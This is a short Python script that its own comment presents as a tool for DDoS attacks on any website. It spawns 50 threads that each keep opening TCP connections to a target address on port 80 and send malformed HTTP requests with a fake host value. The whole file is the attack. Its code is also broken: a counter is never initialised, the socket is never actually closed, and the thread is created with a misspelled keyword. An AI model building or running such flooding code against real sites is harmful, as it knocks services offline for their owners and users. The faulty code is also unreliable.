#this use for make ddos attack in any websites 

import threading
import socket

terget="192.168.1.1"
port=80

fack_ip="172.1.1.0"


def attack():
    while True:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((terget,port))
        s.sendto(("GET /"+terget+"HTTP/1.1\r\n").encode('ascii'),(terget,port))
        s.sendto(("HOST /"+fack_ip+"\r\n\r\n").encode('ascii'),(terget,port))
        s.close

        global already_connected
        already_connected+=1
        if already_connected%50==0:
            print(already_connected)
         
for i in range(50):
    thread=threading.Thread(terget=attack)
    thread.start()